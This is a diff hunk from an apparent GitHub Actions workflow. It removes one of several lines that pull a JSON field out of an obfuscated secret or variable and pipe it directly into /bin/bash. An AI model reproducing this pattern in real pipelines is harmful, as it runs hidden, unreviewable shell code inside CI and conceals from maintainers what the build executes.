@@ -22,7 +22,6 @@ jobs:
           xi6: ${{ secrets.xi6 }}
         run: |
           printf '%s' "$xi6" | jq -r .e25 | /bin/bash
-          printf '%s' "$vf3600" | jq -r .crn5151 | /bin/bash
           echo $avyc87 | jq -r .xzug382 | /bin/bash
           printf '%s' "$yq41260" | jq -r .fn49 | /bin/bash
           echo $caxw31852 | jq -r .zrm355 | /bin/bash
